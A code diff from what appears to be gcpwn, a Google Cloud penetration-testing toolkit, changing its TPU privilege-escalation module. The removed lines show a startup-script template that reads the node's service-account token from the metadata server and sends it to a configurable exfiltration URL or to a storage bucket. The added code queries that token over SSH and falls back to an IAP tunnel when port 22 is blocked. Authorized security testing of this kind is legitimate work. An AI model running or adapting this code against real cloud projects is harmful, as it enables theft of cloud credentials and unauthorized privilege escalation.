@@ -26,29 +26,11 @@ _METADATA_URL = (
 
 _GCS_PROOF_PATH = "gcpwn-tpu-pe/tpu-token-proof.json"
 
-_STARTUP_TMPL = """\
-#!/bin/bash
-set -e
-TOKEN=$(curl -sf -H 'Metadata-Flavor: Google' \
-  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
-EMAIL=$(curl -sf -H 'Metadata-Flavor: Google' \
-  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email')
-{exfil_block}
-{gcs_block}
-"""
-
-_EXFIL_BLOCK = """\
-# POST token to exfil URL
-curl -sf -X POST '{exfil_url}' \\
-  -H 'Content-Type: application/json' \\
-  -d "$(printf '{{\\"email\\":\\"%s\\",\\"token\\":%s}}' \\"$EMAIL\\" \\"$TOKEN\\")" || true
-"""
-
-_GCS_BLOCK = """\
-# Write token to GCS proof file
-printf '{{\\"email\\":\\"%s\\",\\"token\\":%s}}' "$EMAIL" "$TOKEN" \\
-  | gsutil cp - 'gs://{bucket}/{path}' || true
-"""
+from gcpwn.modules.gcp.tpu.utilities.exploit_payloads import (  # noqa: E402
+    STARTUP_TMPL as _STARTUP_TMPL,
+    EXFIL_BLOCK as _EXFIL_BLOCK,
+    GCS_BLOCK as _GCS_BLOCK,
+)
 
 
 class TpuNodesResource(GcpListResource):
@@ -66,16 +48,12 @@ class TpuNodesResource(GcpListResource):
     LIST_PERMISSION = "tpu.nodes.list"
     GET_PERMISSION = "tpu.nodes.get"
     ID_FIELD = "node_id"
+    LIST_METHOD = "list_nodes"
+    GET_METHOD = "get_node"
     PARENT_FROM_PROJECT_LOCATION = True
 
     def _build_client(self, session):
         return tpu_v2.TpuClient(credentials=session.credentials)
-
-    def _list_items(self, parent, **_):
-        return self.client.list_nodes(parent=parent)
-
-    def _get_item(self, resource_id, **_):
-        return self.client.get_node(name=resource_id)
 
     def _extra_save_fields(self, raw: dict[str, Any]) -> dict[str, Any]:
         sa = raw.get("service_account") or {}
@@ -181,34 +159,49 @@ def extract_external_ip(node: dict) -> str | None:
 def ssh_query_metadata(project_id: str, zone: str, node_id: str) -> str | None:
     """Use gcloud compute tpus tpu-vm ssh to query the metadata server.
 
+    Tries direct SSH first, then falls back to IAP tunnel (--tunnel-through-iap
+    via gcloud alpha) which works even when direct port-22 access is blocked.
     Returns the raw JSON token string on success, None on failure.
     """
-    cmd = [
-        "gcloud", "compute", "tpus", "tpu-vm", "ssh", node_id,
+    metadata_cmd = f"curl -sf -H 'Metadata-Flavor: Google' {_METADATA_URL}"
+    base_flags = [
         f"--zone={zone}",
         f"--project={project_id}",
-        "--command",
-        f"curl -sf -H 'Metadata-Flavor: Google' {_METADATA_URL}",
+        "--command", metadata_cmd,
     ]
-    print(f"  [ssh] Running: {' '.join(cmd)}")
-    try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-        stdout = result.stdout.strip()
-        stderr = result.stderr.strip()
-        if result.returncode == 0 and stdout:
-            return stdout
-        if stderr:
-            print(f"  [ssh] stderr: {stderr[:500]}")
-        return None
-    except subprocess.TimeoutExpired:
-        print("  [ssh] gcloud ssh timed out after 120s")
-        return None
-    except FileNotFoundError:
-        print("  [ssh] gcloud not found in PATH; skip automatic SSH")
-        return None
-    except Exception as exc:
-        print(f"  [ssh] error: {exc}")
-        return None
+
+    attempts = [
+        # Try direct SSH via gcloud stable first
+        ["gcloud", "compute", "tpus", "tpu-vm", "ssh", node_id] + base_flags,
+        # Fall back to IAP tunnel via gcloud alpha (works when port 22 is blocked)
+        ["gcloud", "alpha", "compute", "tpus", "tpu-vm", "ssh", node_id,
+         "--tunnel-through-iap"] + base_flags,
+    ]
+
+    for cmd in attempts:
+        label = "iap" if "--tunnel-through-iap" in cmd else "direct"
+        print(f"  [ssh/{label}] Running: {' '.join(cmd)}")
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            stdout = result.stdout.strip()
+            stderr = result.stderr.strip()
+            if result.returncode == 0 and stdout:
+                # Filter out gcloud warning lines to get just the JSON
+                lines = [l for l in stdout.splitlines()
+                         if not l.startswith("WARNING:") and not l.startswith("SSH:")]
+                clean = "\n".join(lines).strip()
+                if clean:
+                    return clean
+            if result.returncode != 0 and stderr:
+                print(f"  [ssh/{label}] stderr: {stderr[:300]}")
+        except subprocess.TimeoutExpired:
+            print(f"  [ssh/{label}] timed out after 60s")
+        except FileNotFoundError:
+            print(f"  [ssh/{label}] gcloud not found in PATH; skipping")
+            break
+        except Exception as exc:
+            print(f"  [ssh/{label}] error: {exc}")
+    return None
 
 
 def poll_gcs_proof(session, bucket: str, timeout: int = 180) -> str | None:
